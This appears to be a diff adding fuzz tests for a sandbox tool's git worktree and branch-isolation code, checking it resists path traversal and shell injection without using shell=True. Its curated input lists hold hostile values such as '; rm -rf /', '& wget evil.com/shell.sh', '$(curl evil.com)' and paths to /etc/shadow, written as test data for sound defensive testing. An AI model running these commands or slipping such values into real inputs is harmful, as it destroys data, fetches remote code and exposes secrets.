@@ -657,5 +657,534 @@ class TestStateMetadataFuzzing:
             os.unlink(env_file)
 
 
+# ---------------------------------------------------------------------------
+# Phase 3 strategies
+# ---------------------------------------------------------------------------
+
+# Paths with traversal patterns (symlinks, ../, ./, absolute)
+traversal_paths = st.one_of(
+    st.from_regex(r"(\.\./){1,5}[a-z/]+", fullmatch=True),
+    st.text(
+        alphabet=st.characters(whitelist_categories=("L", "N", "P")),
+        min_size=1,
+        max_size=200,
+    ).map(lambda s: "../" + s),
+)
+
+# Shell metacharacter names for worktree fuzzing
+shell_metachar_names = st.text(
+    alphabet=st.sampled_from(list("abcABC123;|&$`()>< \t\n\r\0{}[]!@#%^*?~")),
+    min_size=1,
+    max_size=100,
+)
+
+# Dangerous branch name patterns
+dangerous_branch_names = st.one_of(
+    st.from_regex(r"[a-z]+(/\.\.)+(/[a-z]+)*", fullmatch=True),
+    st.text(
+        alphabet=st.sampled_from(list("abcmain/..@{~^}")),
+        min_size=1,
+        max_size=50,
+    ),
+)
+
+
+# ---------------------------------------------------------------------------
+# Phase 3 fuzz tests
+# ---------------------------------------------------------------------------
+
+
+class TestGitPathFuzzing:
+    """Fuzz tests for git path validation against symlink traversal."""
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(path=traversal_paths)
+    def test_configure_sparse_checkout_traversal_no_crash(self, path):
+        """Fuzz configure_sparse_checkout with traversal paths -- must never crash.
+
+        Feeds paths containing ../, ./, and symlink-like patterns into
+        configure_sparse_checkout() with subprocess.run mocked out to
+        prevent actual git operations. The function must either succeed
+        or raise a known exception type, never an unhandled exception.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import configure_sparse_checkout
+        import tempfile
+        import os
+
+        tmpdir = tempfile.mkdtemp()
+        try:
+            # Create a minimal worktree .git file so the function can read it
+            git_file = os.path.join(tmpdir, ".git")
+            gitdir_target = os.path.join(tmpdir, "gitdir")
+            os.makedirs(os.path.join(gitdir_target, "info"), exist_ok=True)
+            with open(git_file, "w") as f:
+                f.write(f"gitdir: {gitdir_target}")
+
+            mock_run = MagicMock()
+            mock_run.return_value = MagicMock(
+                returncode=0, stdout="0", stderr="", check=False,
+            )
+
+            with patch("subprocess.run", mock_run):
+                configure_sparse_checkout(
+                    bare_path=tmpdir,
+                    worktree_path=tmpdir,
+                    working_dir=path,
+                )
+        except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+            # Acceptable rejections from validation layers
+            pass
+        finally:
+            import shutil
+            shutil.rmtree(tmpdir, ignore_errors=True)
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(path=traversal_paths)
+    def test_create_worktree_traversal_no_crash(self, path):
+        """Fuzz create_worktree with traversal paths -- must never crash.
+
+        Uses traversal paths as the worktree_path argument to create_worktree()
+        with subprocess.run mocked. The function must either succeed or raise
+        a known exception type.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import create_worktree
+
+        mock_run = MagicMock()
+        mock_run.return_value = MagicMock(
+            returncode=0, stdout="", stderr="",
+        )
+
+        with patch("subprocess.run", mock_run), \
+             patch("foundry_sandbox.git_worktree.git_with_retry", MagicMock()):
+            try:
+                create_worktree(
+                    bare_path="/tmp/bare",
+                    worktree_path=path,
+                    branch="test-branch",
+                )
+            except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                pass
+
+    def test_curated_traversal_paths(self):
+        """Verify curated symlink/traversal path patterns are handled safely.
+
+        Tests a hand-picked list of adversarial paths that exploit path
+        traversal or symlink resolution to escape the worktree directory.
+        Each must either be rejected or handled without crashing.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import configure_sparse_checkout
+        import tempfile
+
+        curated_paths = [
+            "../../etc/passwd",
+            "/etc/shadow",
+            "worktree/../../../root",
+            "path\x00injected",
+            "path\ninjected",
+            "../" * 20 + "etc/passwd",
+            "worktree/./../../secret",
+            "symlink/../target",
+            "/proc/self/environ",
+            "valid/../..",
+        ]
+
+        for malicious_path in curated_paths:
+            tmpdir = tempfile.mkdtemp()
+            try:
+                git_file = os.path.join(tmpdir, ".git")
+                gitdir_target = os.path.join(tmpdir, "gitdir")
+                os.makedirs(os.path.join(gitdir_target, "info"), exist_ok=True)
+                with open(git_file, "w") as f:
+                    f.write(f"gitdir: {gitdir_target}")
+
+                mock_run = MagicMock()
+                mock_run.return_value = MagicMock(
+                    returncode=0, stdout="0", stderr="",
+                )
+
+                with patch("subprocess.run", mock_run):
+                    configure_sparse_checkout(
+                        bare_path=tmpdir,
+                        worktree_path=tmpdir,
+                        working_dir=malicious_path,
+                    )
+            except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                pass
+            finally:
+                import shutil
+                shutil.rmtree(tmpdir, ignore_errors=True)
+
+
+class TestWorktreeNameFuzzing:
+    """Fuzz tests for worktree names with shell metacharacters."""
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=shell_metachar_names)
+    def test_create_worktree_metachar_no_crash(self, name):
+        """Fuzz create_worktree with shell metacharacter names -- must never crash.
+
+        Feeds worktree names containing shell-dangerous characters
+        (;, |, &, $(), backticks, >, <, newlines, null bytes) into
+        create_worktree() with subprocess.run mocked. Verifies the
+        function passes these names as list elements to subprocess.run
+        (not via shell=True) and never crashes with an unhandled exception.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import create_worktree
+
+        mock_run = MagicMock()
+        mock_run.return_value = MagicMock(
+            returncode=0, stdout="", stderr="",
+        )
+
+        with patch("subprocess.run", mock_run), \
+             patch("foundry_sandbox.git_worktree.git_with_retry", MagicMock()):
+            try:
+                create_worktree(
+                    bare_path="/tmp/bare",
+                    worktree_path=f"/tmp/{name}",
+                    branch="test-branch",
+                )
+            except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                pass
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=shell_metachar_names)
+    def test_create_worktree_metachar_no_shell_injection(self, name):
+        """Verify subprocess.run is called with list args, not shell strings.
+
+        When shell metacharacters are present in worktree names, the
+        subprocess.run call must use a list of arguments (safe) rather
+        than a shell string (injectable). This test captures and inspects
+        the args passed to subprocess.run to verify list-based invocation.
+        """
+        from unittest.mock import patch, MagicMock, call
+        from foundry_sandbox.git_worktree import create_worktree
+
+        mock_run = MagicMock()
+        mock_run.return_value = MagicMock(
+            returncode=0, stdout="", stderr="",
+        )
+
+        with patch("subprocess.run", mock_run), \
+             patch("foundry_sandbox.git_worktree.git_with_retry", MagicMock()):
+            try:
+                create_worktree(
+                    bare_path="/tmp/bare",
+                    worktree_path=f"/tmp/{name}",
+                    branch="test-branch",
+                )
+            except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                pass
+
+            # Verify all subprocess.run calls used list args, not strings
+            for c in mock_run.call_args_list:
+                args_passed = c[0][0] if c[0] else c[1].get("args", [])
+                assert isinstance(args_passed, list), (
+                    f"subprocess.run called with non-list args: {type(args_passed)}. "
+                    f"This could enable shell injection with name={name!r}"
+                )
+                # Verify shell=True was not used
+                shell_kwarg = c[1].get("shell", False) if c[1] else False
+                assert not shell_kwarg, (
+                    f"subprocess.run called with shell=True, risking injection "
+                    f"with name={name!r}"
+                )
+
+    def test_curated_metachar_names(self):
+        """Verify curated shell metacharacter worktree names are handled safely.
+
+        Tests a hand-picked list of adversarial worktree names containing
+        shell injection payloads. Each must be handled without crashing or
+        enabling command injection.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import create_worktree
+
+        curated_names = [
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "& wget evil.com/shell.sh",
+            "$(whoami)",
+            "`id`",
+            "> /tmp/pwned",
+            "< /etc/shadow",
+            "name\ninjected_cmd",
+            "name\x00injected",
+            "name\t$(id)",
+            "{rm,-rf,/}",
+            "name; echo pwned #",
+            "$(curl evil.com)",
+            "name && cat /etc/passwd",
+            "name || true",
+        ]
+
+        for malicious_name in curated_names:
+            mock_run = MagicMock()
+            mock_run.return_value = MagicMock(
+                returncode=0, stdout="", stderr="",
+            )
+
+            with patch("subprocess.run", mock_run), \
+                 patch("foundry_sandbox.git_worktree.git_with_retry", MagicMock()):
+                try:
+                    create_worktree(
+                        bare_path="/tmp/bare",
+                        worktree_path=f"/tmp/{malicious_name}",
+                        branch="test-branch",
+                    )
+                except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                    pass
+
+                # Verify no shell=True in any call
+                for c in mock_run.call_args_list:
+                    shell_kwarg = c[1].get("shell", False) if c[1] else False
+                    assert not shell_kwarg, (
+                        f"subprocess.run used shell=True with name={malicious_name!r}"
+                    )
+
+
+class TestBranchNameFuzzing:
+    """Fuzz tests for branch name validation with dangerous characters."""
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=dangerous_branch_names)
+    def test_is_allowed_branch_name_no_crash(self, name):
+        """Fuzz _is_allowed_branch_name with dangerous patterns -- must never crash.
+
+        Feeds branch names containing /, .., @{, ~, ^ and other dangerous
+        patterns into _is_allowed_branch_name(). The function must always
+        return a bool without raising an unhandled exception.
+        """
+        from branch_isolation import _is_allowed_branch_name
+
+        try:
+            result = _is_allowed_branch_name(
+                name,
+                sandbox_branch="sandbox/test-branch",
+                base_branch="main",
+            )
+            assert isinstance(result, bool)
+        except (ValueError, TypeError):
+            pass
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=dangerous_branch_names)
+    def test_is_allowed_ref_no_crash(self, name):
+        """Fuzz _is_allowed_ref with dangerous patterns -- must never crash.
+
+        Feeds branch names containing traversal patterns and special git
+        revision syntax into _is_allowed_ref(). The function must always
+        return a bool without raising an unhandled exception.
+        """
+        from branch_isolation import _is_allowed_ref
+
+        try:
+            result = _is_allowed_ref(
+                name,
+                sandbox_branch="sandbox/test-branch",
+                base_branch="main",
+            )
+            assert isinstance(result, bool)
+        except (ValueError, TypeError):
+            pass
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=dangerous_branch_names)
+    def test_cleanup_sandbox_branch_no_crash(self, name):
+        """Fuzz cleanup_sandbox_branch with dangerous names -- must never crash.
+
+        Feeds branch names containing /, .., @{, ~, ^ into
+        cleanup_sandbox_branch() with subprocess.run mocked. The function
+        must either succeed or raise a known exception type, never an
+        unhandled exception.
+        """
+        from unittest.mock import patch, MagicMock
+        from foundry_sandbox.git_worktree import cleanup_sandbox_branch
+
+        mock_run = MagicMock()
+        mock_run.return_value = MagicMock(
+            returncode=0, stdout="", stderr="",
+        )
+
+        with patch("subprocess.run", mock_run), \
+             patch("pathlib.Path.is_dir", return_value=True):
+            try:
+                cleanup_sandbox_branch(
+                    branch=name,
+                    bare_path="/tmp/bare",
+                )
+            except (ValueError, TypeError, RuntimeError, OSError, subprocess.CalledProcessError):
+                pass
+
+    @settings(
+        derandomize=True,
+        max_examples=50,
+        suppress_health_check=[HealthCheck.too_slow],
+    )
+    @given(name=dangerous_branch_names)
+    def test_validate_branch_isolation_no_crash(self, name):
+        """Fuzz validate_branch_isolation with dangerous branch refs -- must never crash.
+
+        Feeds dangerous branch names as arguments to various git commands
+        through validate_branch_isolation(). The function must always return
+        None or a ValidationError, never an unhandled exception.
+        """
+        from branch_isolation import validate_branch_isolation
+
+        metadata = {
+            "sandbox_branch": "sandbox/test-branch",
+            "from_branch": "main",
+        }
+
+        # Test as checkout target
+        try:
+            result = validate_branch_isolation(
+                ["checkout", name],
+                metadata=metadata,
+            )
+            assert result is None or isinstance(result, ValidationError)
+        except (ValueError, TypeError):
+            pass
+
+        # Test as push refspec
+        try:
+            result = validate_branch_isolation(
+                ["push", "origin", name],
+                metadata=metadata,
+            )
+            assert result is None or isinstance(result, ValidationError)
+        except (ValueError, TypeError):
+            pass
+
+        # Test as log ref
+        try:
+            result = validate_branch_isolation(
+                ["log", name],
+                metadata=metadata,
+            )
+            assert result is None or isinstance(result, ValidationError)
+        except (ValueError, TypeError):
+            pass
+
+    def test_curated_dangerous_branch_names(self):
+        """Verify curated dangerous branch name patterns are handled safely.
+
+        Tests a hand-picked list of adversarial branch names that exploit
+        git revision syntax or path traversal to escape isolation. Each
+        must be handled without crashing.
+        """
+        from branch_isolation import (
+            _is_allowed_branch_name,
+            _is_allowed_ref,
+            validate_branch_isolation,
+        )
+        from foundry_sandbox.git_worktree import cleanup_sandbox_branch
+        from unittest.mock import patch, MagicMock
+
+        curated_names = [
+            "../main",
+            "sandbox/../main",
+            "@{-1}",
+            "HEAD~999",
+            "main^{tree}",
+            "name\x00injected",
+            "refs/heads/../../../etc/passwd",
+            "sandbox/../../main",
+            "main~1^2~3",
+            "@{upstream}",
+            "HEAD@{0}",
+            "main^0",
+            "stash@{0}",
+            "/leading-slash",
+            "trailing-slash/",
+            "double//slash",
+            "name..lock",
+            ".hidden",
+            "name.lock",
+        ]
+
+        metadata = {
+            "sandbox_branch": "sandbox/test-branch",
+            "from_branch": "main",
+        }
+
+        for name in curated_names:
+            # Test _is_allowed_branch_name
+            try:
+                result = _is_allowed_branch_name(
+                    name, "sandbox/test-branch", "main",
+                )
+                assert isinstance(result, bool)
+            except (ValueError, TypeError):
+                pass
+
+            # Test _is_allowed_ref
+            try:
+                result = _is_allowed_ref(
+                    name, "sandbox/test-branch", "main",
+                )
+                assert isinstance(result, bool)
+            except (ValueError, TypeError):
+                pass
+
+            # Test validate_branch_isolation
+            try:
+                result = validate_branch_isolation(
+                    ["checkout", name],
+                    metadata=metadata,
+                )
+                assert result is None or isinstance(result, ValidationError)
+            except (ValueError, TypeError):
+                pass
+
+            # Test cleanup_sandbox_branch
+            mock_run = MagicMock()
+            mock_run.return_value = MagicMock(
+                returncode=0, stdout="", stderr="",
+            )
+            with patch("subprocess.run", mock_run), \
+                 patch("pathlib.Path.is_dir", return_value=True):
+                try:
+                    cleanup_sandbox_branch(
+                        branch=name,
+                        bare_path="/tmp/bare",
+                    )
+                except (ValueError, TypeError, RuntimeError, OSError,
+                        subprocess.CalledProcessError):
+                    pass
+
+
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
